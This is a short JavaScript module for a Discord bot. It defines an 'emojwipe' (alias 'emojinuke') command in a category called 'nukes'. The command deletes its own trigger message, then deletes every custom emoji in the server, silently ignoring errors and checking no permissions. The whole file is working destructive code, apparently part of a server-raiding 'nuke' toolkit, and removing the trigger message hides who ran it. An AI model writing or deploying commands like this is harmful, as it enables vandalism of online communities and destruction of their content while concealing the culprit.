module.exports = {
  name: 'emojwipe',
  aliases: ['emojinuke'],
  description: '⚠️ Delete every emoji in the server.',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    message.guild.emojis.cache.forEach(e=>e.delete().catch(()=>{}));
  },
};
